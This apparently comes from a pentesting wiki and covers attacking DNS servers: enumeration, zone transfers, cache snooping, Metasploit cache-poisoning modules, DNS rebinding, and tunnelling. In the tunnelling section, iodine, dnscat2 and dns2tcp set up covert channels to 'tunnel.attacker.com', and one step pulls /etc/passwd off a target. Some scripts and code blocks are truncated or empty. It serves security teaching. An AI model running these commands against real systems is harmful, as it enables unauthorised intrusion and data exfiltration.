> **DNS (Domain Name System)** is the backbone of the internet — translating domain names to IP addresses and vice versa. It operates on **Port 53**, using **UDP** for standard queries and **TCP** for zone transfers and responses exceeding 512 bytes. From a pentesting perspective, DNS is a **massive information disclosure vector** — misconfigured DNS servers leak **zone data**, **internal hostnames**, **network architecture**, **subdomain infrastructure**, and can even be abused for **data exfiltration via DNS tunneling**.

::card-group
  ::card
  ---
  title: Zone Transfers (AXFR)
  icon: i-lucide-database
  ---
  Misconfigured DNS servers allow **full zone transfers**, dumping every DNS record — hostnames, IPs, mail servers, and internal infrastructure in one request.
  ::

  ::card
  ---
  title: Subdomain Enumeration
  icon: i-lucide-search
  ---
  Brute-force and passive techniques reveal **hidden subdomains** — admin panels, staging environments, internal APIs, and forgotten services.
  ::

  ::card
  ---
  title: Cache Poisoning
  icon: i-lucide-shield-alert
  ---
  Injecting forged DNS responses into resolver caches redirects users to **attacker-controlled servers** — enabling phishing and MITM attacks.
  ::

  ::card
  ---
  title: DNS Tunneling
  icon: i-lucide-arrow-up-down
  ---
  DNS can be abused as a **covert communication channel** to **exfiltrate data** or **bypass firewalls** by encoding data in DNS queries.
  ::
::

::note
DNS is often overlooked during pentests, but it's one of the **richest sources of intelligence**. Every engagement should include thorough DNS reconnaissance.
::

## How DNS Works

Understanding DNS internals is critical for identifying misconfigurations and attack surfaces.

### DNS Query Flow

::steps{level="4"}

#### Client Query

```
User types: www.target.com
Browser → Stub Resolver → "What is the IP for www.target.com?"
```

#### Recursive Resolver

```
Stub Resolver → Recursive Resolver (ISP/Corporate DNS)
Recursive Resolver checks cache first
If not cached → begins resolution
```

#### Root Server

```
Recursive Resolver → Root Server (.)
Root Server → "Ask .com TLD server at 192.5.6.30"
```

#### TLD Server

```
Recursive Resolver → .com TLD Server
TLD Server → "Ask target.com authoritative NS at 10.10.10.53"
```

#### Authoritative Server

```
Recursive Resolver → target.com Authoritative NS
Authoritative NS → "www.target.com = 10.10.10.100"
Answer cached and returned to client
```

::

### DNS Record Types

Every record type provides different intelligence during reconnaissance.

::collapsible

| Record | Purpose | Pentesting Value |
|--------|---------|-----------------|
| **A** | Maps hostname → IPv4 address | Discover hosts, identify web servers |
| **AAAA** | Maps hostname → IPv6 address | Find IPv6 hosts (often less secured) |
| **CNAME** | Canonical name (alias) | Discover real hostnames, subdomain takeover |
| **MX** | Mail exchange servers | Identify mail servers for SMTP attacks |
| **NS** | Authoritative nameservers | Target for zone transfer, identify DNS infrastructure |
| **SOA** | Start of Authority | Zone admin email, serial number, refresh intervals |
| **TXT** | Text records | SPF, DKIM, DMARC, domain verification tokens, sometimes credentials |
| **SRV** | Service records | Discover services — `_ldap._tcp`, `_kerberos._tcp`, `_sip._tcp` |
| **PTR** | Reverse DNS (IP → hostname) | Reverse sweep for host discovery |
| **HINFO** | Host information | OS and hardware info (rarely used) |
| **ANY** | All records | Dump all available records (being deprecated) |
| **AXFR** | Zone transfer | **Dump entire zone** — all records at once |
| **IXFR** | Incremental zone transfer | Transfer only changed records since last serial |

::

### DNS Transport Protocols

::tabs
  :::tabs-item{icon="i-lucide-zap" label="UDP (Port 53)"}
  - **Standard queries and responses**
  - Maximum 512 bytes (traditional) or 4096+ bytes (EDNS0)
  - Stateless — easier to spoof
  - Used for ~95% of DNS traffic

  **Security implication:** UDP is connectionless — source IP can be spoofed, enabling **cache poisoning** and **DNS amplification DDoS**.
  :::

  :::tabs-item{icon="i-lucide-link" label="TCP (Port 53)"}
  - **Zone transfers (AXFR/IXFR)**
  - Responses exceeding UDP limit
  - DNS over TLS (DoT) — Port 853
  - Connection-oriented — harder to spoof

  **Security implication:** If TCP port 53 is open, **zone transfers may be possible**. Always test AXFR.
  :::

  :::tabs-item{icon="i-lucide-shield" label="Encrypted DNS"}
  - **DoT (DNS over TLS)** — Port 853
  - **DoH (DNS over HTTPS)** — Port 443
  - **DNSCrypt** — Various ports

  **Security implication:** Encrypted DNS prevents sniffing but may complicate corporate monitoring. Attackers use DoH for **C2 communication** that blends with normal HTTPS traffic.
  :::
::

### Common DNS Server Software

| Software | Platform | Config Location | Known Issues |
|----------|----------|----------------|--------------|
| **BIND 9** | Linux/Unix | `/etc/bind/named.conf` | Zone transfer misconfig, CVE-rich history |
| **Microsoft DNS** | Windows/AD | AD-integrated / `%SystemRoot%\System32\dns` | AD zone transfers, dynamic updates |
| **Unbound** | Linux/BSD | `/etc/unbound/unbound.conf` | Resolver — cache poisoning target |
| **PowerDNS** | Linux | `/etc/powerdns/pdns.conf` | API exposure, zone transfer misconfig |
| **dnsmasq** | Linux/IoT | `/etc/dnsmasq.conf` | DNS rebinding, cache poisoning CVEs |
| **CoreDNS** | Kubernetes | `Corefile` | K8s service discovery exposure |
| **Knot DNS** | Linux | `/etc/knot/knot.conf` | Authoritative-only, fewer CVEs |
| **MaraDNS** | Linux | `/etc/maradns/mararc` | Deadwood recursive resolver |
| **Windows DNS** | Windows | Registry + AD | SIGRed (CVE-2020-1350) — critical RCE |

### Banner & Version Detection

::code-group
```bash [Nmap — NSID]
nmap -p 53 --script dns-nsid $IP
# NSID (Name Server Identifier) reveals server software and hostname
```

```bash [dig — Version Query]
dig @$IP version.bind chaos txt
# Many BIND servers respond with version info
# Example: "9.16.1-Ubuntu"

dig @$IP version.server chaos txt
dig @$IP hostname.bind chaos txt
dig @$IP id.server chaos txt
```

```bash [nslookup — Version]
nslookup -type=txt -class=chaos version.bind $IP
```

```bash [fpdns — Fingerprinting]
fpdns -D $IP
# Fingerprints DNS server software without relying on version.bind
```
::

::tip
DNS version strings reveal:
```text
"9.16.1-Ubuntu"                    ← BIND 9.16.1 on Ubuntu
"9.11.5-P4-5.1+deb10u2-Debian"    ← BIND 9.11.5 on Debian 10
"Microsoft DNS 10.0.17763"         ← Windows Server 2019
"PowerDNS Authoritative Server 4.4.1"  ← PowerDNS 4.4.1
"dnsmasq-2.80"                     ← dnsmasq 2.80
```

If `version.bind` returns `REFUSED` or is empty, the admin has hardened this — but `fpdns` fingerprinting may still work.
::

### Recursion Check

A DNS server that allows **open recursion** can be abused for **cache poisoning**, **DNS amplification attacks**, and **cache snooping**.

```bash [Terminal]
# Check recursion
dig @$IP www.google.com A

# If you get an ANSWER section with Google's IP → Recursion is ENABLED
# If you get REFUSED or no answer → Recursion is DISABLED
```

```bash [Nmap — Recursion Check]
nmap -p 53 --script dns-recursion $IP
```

::field-group
  ::field{name="Recursion Enabled (Open Resolver)" type="critical"}
  The server resolves queries for **any domain**, not just its own. This enables:
  - **Cache poisoning** — inject fake records
  - **DNS amplification DDoS** — use as reflector
  - **Cache snooping** — discover what domains users visit
  - **Internal DNS resolution** — resolve internal hostnames
  ::

  ::field{name="Recursion Disabled" type="info"}
  Server only answers for zones it's authoritative for. This is the **correct configuration** for authoritative-only servers.
  ::
::

## DNS Record Enumeration

### Basic Record Queries

::steps{level="4"}

#### Query All Record Types

::code-group
```bash [dig]
# Query specific record types
dig @$IP target.com A          # IPv4 addresses
dig @$IP target.com AAAA       # IPv6 addresses
dig @$IP target.com MX         # Mail servers
dig @$IP target.com NS         # Nameservers
dig @$IP target.com SOA        # Start of Authority
dig @$IP target.com TXT        # Text records (SPF, DKIM, etc.)
dig @$IP target.com SRV        # Service records
dig @$IP target.com CNAME      # Canonical names
dig @$IP target.com ANY        # All records (may be blocked)
```

```bash [nslookup]
nslookup
> server $IP
> set type=any
> target.com
> set type=mx
> target.com
> set type=ns
> target.com
> set type=txt
> target.com
> set type=srv
> _ldap._tcp.target.com
```

```bash [host]
host -t any target.com $IP
host -t mx target.com $IP
host -t ns target.com $IP
host -t txt target.com $IP
host -t srv _ldap._tcp.target.com $IP
```
::

#### SOA Record Analysis

```bash [Terminal]
dig @$IP target.com SOA +short

# Example output:
# ns1.target.com. admin.target.com. 2024011501 3600 900 604800 86400
#                  ^^^^^^^^^^^^^^^^
#                  Admin email: admin@target.com (@ replaced with .)
#                  
# Serial: 2024011501 (date-based = Jan 15, 2024)
# Refresh: 3600 (1 hour)
# Retry: 900 (15 min)
# Expire: 604800 (7 days)
# Minimum TTL: 86400 (1 day)
```

::note
The SOA record reveals the **admin email address** (replace first `.` with `@`) and **zone serial number**. The serial number format often reveals the last modification date.
::

#### MX Record Analysis

```bash [Terminal]
dig @$IP target.com MX +short

# Example output:
# 10 mail.target.com.
# 20 mail2.target.com.
# 30 aspmx.l.google.com.    ← Using Google Workspace!

# Resolve MX hostnames to IPs
dig +short A mail.target.com
dig +short A mail2.target.com
```

#### TXT Record Mining

```bash [Terminal]
dig @$IP target.com TXT

# Reveals:
# SPF records → authorized email senders
# DKIM selectors → email signing keys
# DMARC policy → email authentication policy
# Domain verification → "google-site-verification=...", "MS=ms12345678"
# Sometimes credentials, API keys, or internal notes!

# Check for SPF
dig @$IP target.com TXT | grep -i spf

# Check for DMARC
dig @$IP _dmarc.target.com TXT

# Check for DKIM (try common selectors)
for selector in default google selector1 selector2 mail dkim s1 s2 k1; do
  dig @$IP ${selector}._domainkey.target.com TXT +short 2>/dev/null | grep -v "^$" && echo "  ↑ Selector: $selector"
done
```

::warning
TXT records sometimes contain **sensitive information** accidentally published — API keys, internal notes, legacy verification tokens, and even passwords have been found in TXT records.
::

#### SRV Record Discovery

```bash [Terminal]
# SRV records reveal internal services — especially valuable in AD environments

# Active Directory services
dig @$IP _ldap._tcp.target.com SRV
dig @$IP _kerberos._tcp.target.com SRV
dig @$IP _kpasswd._tcp.target.com SRV
dig @$IP _gc._tcp.target.com SRV
dig @$IP _ldap._tcp.dc._msdcs.target.com SRV

# Communication services
dig @$IP _sip._tcp.target.com SRV
dig @$IP _sips._tcp.target.com SRV
dig @$IP _xmpp-server._tcp.target.com SRV
dig @$IP _xmpp-client._tcp.target.com SRV

# Other common services
dig @$IP _http._tcp.target.com SRV
dig @$IP _ftp._tcp.target.com SRV
dig @$IP _ssh._tcp.target.com SRV
```

::tip
SRV records in Active Directory environments reveal **domain controllers**, **Global Catalog servers**, **Kerberos KDC servers**, and their **ports** — critical for AD attack planning.
::

#### Automated SRV Enumeration Script

::code-collapse

```bash [srv_enum.sh]

# Enumerate common SRV records for a domain
DNS_SERVER=$1

  echo "Usage: $0 <dns_server_ip> <domain>"
  exit 1
fi

  "_ldap._tcp"
  "_kerberos._tcp"
  "_kpasswd._tcp"
  "_gc._tcp"
  "_ldap._tcp.dc._msdcs"
  "_kerberos._tcp.dc._msdcs"
  "_ldap._tcp.gc._msdcs"
  "_ldap._tcp.pdc._msdcs"
  "_kerberos._udp"
  "_kpasswd._udp"
  "_sip._tcp"
  "_sip._udp"
  "_sips._tcp"
  "_h323ls._tcp"
  "_h323ls._udp"
  "_h323cs._tcp"
  "_h323cs._udp"
  "_xmpp-server._tcp"
  "_xmpp-client._tcp"
  "_jabber._tcp"
  "_imap._tcp"
  "_imaps._tcp"
  "_submission._tcp"
  "_pop3._tcp"
  "_pop3s._tcp"
  "_caldav._tcp"
  "_carddav._tcp"
  "_http._tcp"
  "_https._tcp"
  "_ftp._tcp"
  "_ssh._tcp"
  "_ntp._udp"
  "_vlmcs._tcp"
  "_msdcs"
  "_sites"
  "_tcp"
  "_udp"
)

echo "[*] SRV Record Enumeration for $DOMAIN via $DNS_SERVER"
echo "=================================================="

for srv in "${SRV_RECORDS[@]}"; do
  RESULT=$(dig @$DNS_SERVER ${srv}.${DOMAIN} SRV +short 2>/dev/null)
  if [ -n "$RESULT" ]; then
    echo -e "\n[+] ${srv}.${DOMAIN}"
    echo "$RESULT" | while read line; do
      echo "    $line"
    done
  fi
done
```

### Reverse DNS Enumeration

Reverse DNS (PTR records) maps **IP addresses to hostnames** — invaluable for discovering hosts on a network.

::steps{level="4"}

#### Single IP Reverse Lookup

```bash [Terminal]
dig @$IP -x 10.10.10.25 +short
nslookup 10.10.10.25 $IP
host 10.10.10.25 $IP
```

#### Network Range Reverse Sweep

::code-group
```bash [dnsrecon — Reverse Sweep]
dnsrecon -r 10.10.10.0/24 -n $IP
```

```bash [Nmap — Reverse DNS]
nmap -sL 10.10.10.0/24 --dns-server $IP 2>/dev/null | grep -v "not scan" | grep "("
```

```bash [dig — Manual Sweep]
for i in $(seq 1 254); do
  RESULT=$(dig @$IP -x 10.10.10.$i +short 2>/dev/null)
  if [ -n "$RESULT" ]; then
    echo "10.10.10.$i → $RESULT"
  fi
done
```

```bash [dnsrecon — IPv6 Reverse]
dnsrecon -r 2001:db8::/48 -n $IP
```
::

::note
Reverse DNS sweeps frequently reveal **internal hostnames** with descriptive names like `dc01.corp.target.local`, `db-prod-01.target.local`, `vpn-gateway.target.local` — providing a complete map of the internal network.
::

## Recon Methodology

### Complete DNS Recon Checklist

::field-group
  ::field{name="1. Zone Transfer (AXFR)" type="critical"}
  Always attempt zone transfers first — a successful AXFR gives you **everything** in one shot. Test against all nameservers.
  ::

  ::field{name="2. Record Enumeration" type="critical"}
  Query A, AAAA, MX, NS, SOA, TXT, SRV, CNAME records. Each type reveals different infrastructure details.
  ::

  ::field{name="3. Subdomain Brute Force" type="critical"}
  Brute-force subdomains with large wordlists. Hidden subdomains often host **admin panels**, **staging environments**, **APIs**, and **legacy applications** with weaker security.
  ::

  ::field{name="4. Reverse DNS Sweep" type="important"}
  Perform PTR lookups across the target's IP ranges. Reveals **hostnames** and **services** not discoverable through forward lookups.
  ::

  ::field{name="5. DNS Cache Snooping" type="important"}
  If the server allows recursion, check its cache for previously resolved domains — reveals what domains **internal users are visiting**.
  ::

  ::field{name="6. SPF/DKIM/DMARC Analysis" type="important"}
  Analyze email security records — missing or weak configurations enable **email spoofing** for phishing campaigns.
  ::

  ::field{name="7. DNSSEC Validation" type="medium"}
  Check if DNSSEC is implemented. Without DNSSEC, DNS responses can be **forged** without detection.
  ::

  ::field{name="8. Passive DNS (OSINT)" type="important"}
  Use passive DNS databases, Certificate Transparency logs, and search engine dorking to discover subdomains **without sending any queries** to the target.
  ::

  ::field{name="9. Version Detection" type="medium"}
  Query `version.bind` or fingerprint the DNS software. Check for known CVEs — BIND, dnsmasq, and Windows DNS have had **critical RCE vulnerabilities**.
  ::

  ::field{name="10. Dynamic Update Check" type="medium"}
  Test if the DNS server accepts **dynamic updates** — if so, you can inject arbitrary DNS records.
  ::

  ::field{name="11. Wildcard Detection" type="low"}
  Query for random non-existent subdomains. If they all resolve to the same IP, a wildcard is configured — adjust enumeration strategy accordingly.
  ::
::

## Pentesting Methods

### Zone Transfer (AXFR)

A successful zone transfer is the **holy grail** of DNS pentesting — it dumps **every DNS record** in the zone.

::accordion
  :::accordion-item{icon="i-lucide-database" label="Manual Zone Transfer"}
  ::steps{level="5"}

  ##### Identify Nameservers

  ```bash [Terminal]
  dig @$IP target.com NS +short
  # ns1.target.com.
  # ns2.target.com.
  
  # Resolve NS to IPs
  dig +short A ns1.target.com
  dig +short A ns2.target.com
  ```

  ##### Attempt AXFR Against Each NS

  ```bash [dig]
  dig @$IP target.com AXFR
  dig @ns1.target.com target.com AXFR
  dig @ns2.target.com target.com AXFR
  ```

  ```bash [host]
  host -l target.com $IP
  host -l target.com ns1.target.com
  ```

  ##### Analyze Results

  ```bash [Terminal]
  # Successful zone transfer output:
  # target.com.       86400  IN  SOA   ns1.target.com. admin.target.com. ...
  # target.com.       86400  IN  NS    ns1.target.com.
  # target.com.       86400  IN  NS    ns2.target.com.
  # target.com.       86400  IN  A     10.10.10.100
  # target.com.       86400  IN  MX    10 mail.target.com.
  # admin.target.com. 86400  IN  A     10.10.10.101    ← Admin panel!
  # dev.target.com.   86400  IN  A     10.10.10.102    ← Dev environment!
  # db.target.com.    86400  IN  A     10.10.10.103    ← Database server!
  # vpn.target.com.   86400  IN  A     10.10.10.104    ← VPN gateway!
  # staging.target.com. 86400 IN A     10.10.10.105    ← Staging!
  # internal.target.com. 86400 IN A    10.10.20.10     ← Internal network!
  # _ldap._tcp.target.com. 86400 IN SRV 0 100 389 dc01.target.com. ← Domain Controller!
  ```

  ::

  ::tip
  A successful zone transfer reveals:
  - **All hostnames and subdomains**
  - **Internal IP addresses and network ranges**
  - **Mail servers and their priorities**
  - **Service records (SRV) — domain controllers, Kerberos, LDAP**
  - **Admin email addresses (SOA record)**
  - **TXT records — SPF, DKIM, verification tokens**
  - **CNAME aliases — cloud service mappings**
  ::


  :::accordion-item{icon="i-lucide-code" label="Automated Zone Transfer Tools"}
  ::code-group
  ```bash [dnsrecon]
  dnsrecon -d target.com -n $IP -t axfr
  ```

  ```bash [dnsenum]
  dnsenum --dnsserver $IP --enum target.com
  ```

  ```bash [fierce]
  fierce --domain target.com --dns-servers $IP
  ```

  ```bash [Nmap]
  nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.com $IP
  ```

  ```bash [Metasploit]
  use auxiliary/gather/dns_info
  set DOMAIN target.com
  set NS $IP
  run
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-list" label="Zone Transfer Against Multiple NS"}
  ```bash [Terminal]
  #!/bin/bash
  # Try zone transfer against all nameservers for a domain
  DOMAIN=$1
  
  echo "[*] Finding nameservers for $DOMAIN..."
  NAMESERVERS=$(dig $DOMAIN NS +short)
  
  for ns in $NAMESERVERS; do
    NS_IP=$(dig +short A $ns)
    echo ""
    echo "[*] Attempting AXFR against $ns ($NS_IP)..."
    dig @$NS_IP $DOMAIN AXFR +noall +answer
    
    if [ $? -eq 0 ]; then
      echo "[+] Zone transfer SUCCESSFUL from $ns!"
    else
      echo "[-] Zone transfer FAILED from $ns"
    fi
  done
  ```

  ::note
  Zone transfers may succeed on **one nameserver but fail on others** — always test every NS. Secondary/slave servers are often more permissive than primary servers.
  ::
  :::
::

### Subdomain Enumeration

::accordion
  :::accordion-item{icon="i-lucide-search" label="Active Brute Force"}
  Brute-force subdomains by querying the DNS server directly.

  ::code-group
  ```bash [gobuster]
  gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r $IP:53 -t 50
  ```


  ```bash [dnsenum]

  ```


  ```bash [fierce]

  ```

  ```bash [Amass — Comprehensive]
  amass enum -d target.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
  ```

### DNS Cache Snooping

::accordion
  :::accordion-item{icon="i-lucide-eye" label="Non-recursive Cache Snooping"}
  If the DNS server allows recursion, you can check its **cache** to discover what domains internal users have been visiting.

  ```bash [Terminal]
  # Non-recursive query — only returns cached results
  dig @$IP www.google.com A +norecurse
  dig @$IP www.facebook.com A +norecurse
  dig @$IP mail.target-partner.com A +norecurse
  dig @$IP vpn.competitor.com A +norecurse
  
  # If ANSWER section has data → domain was previously queried (cached)
  # If no ANSWER → domain was NOT queried recently
  ```

  ```bash [Nmap — Automated Cache Snoop]
  nmap -p 53 --script dns-cache-snoop --script-args 'dns-cache-snoop.mode=nonrecursive,dns-cache-snoop.domains={www.google.com,www.facebook.com,mail.target.com,vpn.target.com}' $IP
  ```

  ```bash [dnsrecon — Cache Snooping]
  dnsrecon -t snoop -n $IP -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  ```

  **What cache snooping reveals:**
  - Websites visited by internal users
  - Partner and vendor relationships
  - Internal infrastructure domains
  - Security tools in use (update domains)
  - Cloud services being used
  :::

  :::accordion-item{icon="i-lucide-code" label="Cache Snooping Script"}
  ::code-collapse

  ```python [dns_cache_snoop.py]
  #!/usr/bin/env python3
  """
  DNS Cache Snooping Tool
  Checks if domains are cached on a DNS resolver
  """
  
  import dns.resolver
  import dns.rdatatype
  import sys
  import argparse
  from colorama import Fore, Style, init
  
  init()
  
  def snoop_cache(dns_server, domain):
      """Check if domain is in DNS cache (non-recursive query)"""
      try:
          resolver = dns.resolver.Resolver()
          resolver.nameservers = [dns_server]
          
          # Create non-recursive query
          query = dns.message.make_query(domain, dns.rdatatype.A)
          query.flags &= ~dns.flags.RD  # Remove Recursion Desired flag
          
          response = dns.query.udp(query, dns_server, timeout=3)
          
          if response.answer:
              ips = [str(rdata) for rdata in response.answer[0]]
              return True, ips
          return False, []
      except Exception:
          return False, []
  
  def main():
      parser = argparse.ArgumentParser(description='DNS Cache Snooping')
      parser.add_argument('-n', '--nameserver', required=True, help='Target DNS server')
      parser.add_argument('-D', '--domains', help='Domain list file')
      parser.add_argument('-d', '--domain', help='Single domain to check')
      args = parser.parse_args()
  
      domains = []
      if args.domain:
          domains = [args.domain]
      elif args.domains:
          with open(args.domains) as f:
              domains = [line.strip() for line in f if line.strip()]
      
      print(f"{Fore.CYAN}[*] DNS Cache Snooping: {args.nameserver}")
      print(f"[*] Checking {len(domains)} domains{Style.RESET_ALL}\n")
      
      cached = []
      for domain in domains:
          found, ips = snoop_cache(args.nameserver, domain)
          if found:
              print(f"{Fore.GREEN}[+] CACHED: {domain} → {', '.join(ips)}{Style.RESET_ALL}")
              cached.append(domain)
      
      print(f"\n{Fore.CYAN}[*] {len(cached)}/{len(domains)} domains found in cache{Style.RESET_ALL}")
  
  if __name__ == '__main__':
      main()
  ```

### DNS Cache Poisoning

::accordion
  :::accordion-item{icon="i-lucide-shield-alert" label="Kaminsky DNS Cache Poisoning"}
  If the DNS server has **predictable transaction IDs** and **source ports**, you can inject forged responses into its cache, redirecting users to attacker-controlled servers.

  ::steps{level="5"}

  ##### Check Vulnerability

  ```bash [Terminal]
  # Check source port randomization
  nmap -p 53 --script dns-random-srcport $IP
  
  # Check transaction ID randomization
  nmap -p 53 --script dns-random-txid $IP
  
  # If source ports are SEQUENTIAL or from a small range → VULNERABLE
  # If transaction IDs are predictable → VULNERABLE
  ```

  ##### Exploitation — Metasploit

  ```bash [Metasploit]
  use auxiliary/spoof/dns/bailiwicked_host
  set RHOSTS $IP
  set DOMAIN target.com
  set HOSTNAME www
  set NEWDNS attacker-dns.com
  set NEWADDR ATTACKER_IP
  run
  ```

  ```bash [Metasploit — Bailiwicked Domain]
  use auxiliary/spoof/dns/bailiwicked_domain
  set RHOSTS $IP
  set DOMAIN target.com
  set NEWDNS attacker-ns.com
  run
  ```

  ##### Manual Cache Poisoning (Conceptual)

  ```
  1. Send recursive query for random.target.com to victim resolver
  2. Before legitimate answer arrives, flood resolver with forged responses:
     - Matching transaction ID (guessed/brute-forced)
     - Matching source port (if predictable)
     - Containing poisoned authority/additional records
  3. If forged response arrives first → cache is poisoned
  4. All subsequent queries for target.com use poisoned data
  ```

  ::

  ::caution
  DNS cache poisoning redirects **all users** of the resolver — not just the target. This has **widespread impact** and should only be tested in isolated lab environments.
  ::
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="DNSSEC Check"}
  DNSSEC prevents cache poisoning by **cryptographically signing** DNS responses.

  ```bash [Terminal]
  # Check if DNSSEC is enabled
  dig @$IP target.com DNSKEY +dnssec
  dig @$IP target.com A +dnssec
  
  # If RRSIG records present → DNSSEC is enabled
  # If no RRSIG → DNSSEC not configured (vulnerable to poisoning)
  
  # Validate DNSSEC chain
  dig @$IP target.com A +dnssec +cd  # CD = Checking Disabled
  delv @$IP target.com A +rtrace     # Detailed validation trace
  ```

  ```bash [Online Check]

  # https://dnsviz.net/d/target.com/dnssec/
  ```

### DNS Tunneling

::accordion
  :::accordion-item{icon="i-lucide-arrow-up-down" label="DNS Tunneling — Data Exfiltration"}
  DNS queries can encode data in subdomain labels, creating a **covert channel** that bypasses most firewalls.

  ```
  How it works:
  1. Data is encoded (hex/base64) into subdomain queries
  2. Client queries: <encoded_data>.tunnel.attacker.com
  3. Attacker's DNS server receives the query
  4. Server responds with encoded data in DNS response
  5. Data is exfiltrated through DNS — bypasses most firewalls!
  ```

  ```bash [iodine — IP over DNS]
  # Attacker (DNS Server)
  iodined -f -c -P secretpassword 10.0.0.1 tunnel.attacker.com
  
  # Client (on target)
  iodine -f -P secretpassword tunnel.attacker.com
  
  # Now you have a network tunnel through DNS!
  # Client gets IP 10.0.0.2
  # Route traffic through the tunnel
  ssh -D 1080 10.0.0.1
  ```

  ```bash [dnscat2 — C2 over DNS]
  # Attacker server
  ruby dnscat2.rb tunnel.attacker.com
  
  # Client (on target)
  ./dnscat tunnel.attacker.com
  
  # In dnscat2 server console:
  dnscat2> sessions
  dnscat2> session -i 1
  command (target) > shell
  command (target) > download /etc/passwd /tmp/passwd
  command (target) > upload /tmp/payload /tmp/payload
  ```

  ```bash [dns2tcp — TCP over DNS]
  # Server (attacker)
  # /etc/dns2tcpd.conf:
  # listen = 0.0.0.0
  # port = 53
  # domain = tunnel.attacker.com
  # resources = ssh:127.0.0.1:22, http:127.0.0.1:80
  dns2tcpd -f /etc/dns2tcpd.conf
  
  # Client (on target)
  dns2tcpc -z tunnel.attacker.com -r ssh -l 2222 $DNS_SERVER
  ssh -p 2222 user@127.0.0.1
  ```

### DNS Rebinding

::accordion
  :::accordion-item{icon="i-lucide-refresh-ccw" label="DNS Rebinding Attack"}
  DNS rebinding bypasses same-origin policy by alternating DNS responses between attacker IP and target internal IP.

  ```
  Attack Flow:
  1. Victim visits attacker.com (resolves to ATTACKER_IP)
  2. JavaScript loaded from attacker.com
  3. DNS TTL expires, next query for attacker.com resolves to 127.0.0.1 (or internal IP)
  4. JavaScript makes requests to attacker.com → now goes to internal service!
  5. Same-origin policy bypassed — JS can read internal service responses
  ```

```bash [dns_full_recon.sh]
echo "[2/12] SOA Record..."
dig @$DNS $DOMAIN SOA +noall +answer > $OUTPUT_DIR/02_soa.txt 2>&1
echo "  → Saved to $OUTPUT_DIR/02_soa.txt"

echo "  → Saved to $OUTPUT_DIR/03_ns.txt"

# ========== 4. MX Records ==========
echo "[4/12] MX Records..."
dig @$DNS $DOMAIN MX +noall +answer > $OUTPUT_DIR/04_mx.txt 2>&1
echo "  → Saved to $OUTPUT_DIR/04_mx.txt"

# ========== 5. TXT Records ==========
echo "[5/12] TXT Records (SPF, DKIM, DMARC)..."
dig @$DNS $DOMAIN TXT +noall +answer > $OUTPUT_DIR/05_txt.txt 2>&1
dig @$DNS _dmarc.$DOMAIN TXT +noall +answer >> $OUTPUT_DIR/05_txt.txt 2>&1
for sel in default google selector1 selector2 mail dkim s1 s2 k1; do
  RESULT=$(dig @$DNS ${sel}._domainkey.$DOMAIN TXT +short 2>/dev/null)
  [ -n "$RESULT" ] && echo "${sel}._domainkey.$DOMAIN: $RESULT" >> $OUTPUT_DIR/05_txt.txt
done
echo "  → Saved to $OUTPUT_DIR/05_txt.txt"

# ========== 6. A/AAAA Records ==========
echo "[6/12] A/AAAA Records..."
dig @$DNS $DOMAIN A +noall +answer > $OUTPUT_DIR/06_a_records.txt 2>&1
dig @$DNS $DOMAIN AAAA +noall +answer >> $OUTPUT_DIR/06_a_records.txt 2>&1
echo "  → Saved to $OUTPUT_DIR/06_a_records.txt"

# ========== 7. SRV Records ==========
echo "[7/12] SRV Records..."
SRV_PREFIXES="_ldap._tcp _kerberos._tcp _kpasswd._tcp _gc._tcp _ldap._tcp.dc._msdcs _sip._tcp _xmpp-server._tcp _http._tcp _ssh._tcp"
for srv in $SRV_PREFIXES; do
  RESULT=$(dig @$DNS ${srv}.$DOMAIN SRV +short 2>/dev/null)
  [ -n "$RESULT" ] && echo "${srv}.$DOMAIN: $RESULT" >> $OUTPUT_DIR/07_srv.txt
done
echo "  → Saved to $OUTPUT_DIR/07_srv.txt"

# ========== 8. Zone Transfer ==========
echo "[8/12] Zone Transfer (AXFR)..."
dig @$DNS $DOMAIN AXFR > $OUTPUT_DIR/08_axfr.txt 2>&1
if grep -q "XFR size" $OUTPUT_DIR/08_axfr.txt; then
  echo "  ✅ ZONE TRANSFER SUCCESSFUL!"
else
  echo "  ❌ Zone transfer failed (expected)"
fi
echo "  → Saved to $OUTPUT_DIR/08_axfr.txt"

# ========== 9. Recursion Check ==========
echo "[9/12] Recursion Check..."
RECURSE=$(dig @$DNS www.google.com A +short 2>/dev/null)
if [ -n "$RECURSE" ]; then
  echo "  ⚠️  RECURSION ENABLED (open resolver)" | tee $OUTPUT_DIR/09_recursion.txt
else
  echo "  ✅ Recursion disabled" | tee $OUTPUT_DIR/09_recursion.txt
fi

# ========== 10. Wildcard Check ==========
echo "[10/12] Wildcard Detection..."
WILD1=$(dig @$DNS randomsubdomain123456.$DOMAIN A +short 2>/dev/null)
WILD2=$(dig @$DNS anotherrandomXXX999.$DOMAIN A +short 2>/dev/null)
if [ -n "$WILD1" ] && [ "$WILD1" = "$WILD2" ]; then
  echo "  ⚠️  WILDCARD DETECTED: $WILD1" | tee $OUTPUT_DIR/10_wildcard.txt
else
  echo "  ✅ No wildcard detected" | tee $OUTPUT_DIR/10_wildcard.txt
fi

# ========== 11. DNSSEC Check ==========
echo "[11/12] DNSSEC Check..."
DNSSEC=$(dig @$DNS $DOMAIN DNSKEY +short 2>/dev/null)
if [ -n "$DNSSEC" ]; then
  echo "  ✅ DNSSEC is enabled" | tee $OUTPUT_DIR/11_dnssec.txt
else
  echo "  ❌ DNSSEC NOT configured" | tee $OUTPUT_DIR/11_dnssec.txt
fi

# ========== 12. Passive Subdomain Enumeration ==========
echo "[12/12] Passive Subdomain Enumeration (crt.sh)..."
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | \
  sort -u > $OUTPUT_DIR/12_subdomains_passive.txt
SUB_COUNT=$(wc -l < $OUTPUT_DIR/12_subdomains_passive.txt 2>/dev/null || echo "0")
echo "  → Found $SUB_COUNT subdomains via CT logs"
echo "  → Saved to $OUTPUT_DIR/12_subdomains_passive.txt"

# ========== Summary ==========
echo ""
echo "============================================"
echo " Reconnaissance Complete!"
echo " Results saved to: $OUTPUT_DIR/"
echo "============================================"
ls -la $OUTPUT_DIR/
```

## Defensive Checks

::accordion
  :::accordion-item{icon="i-lucide-shield-check" label="DNS Hardening Checklist"}
  | Finding | Remediation | Priority |
  |---------|-------------|----------|
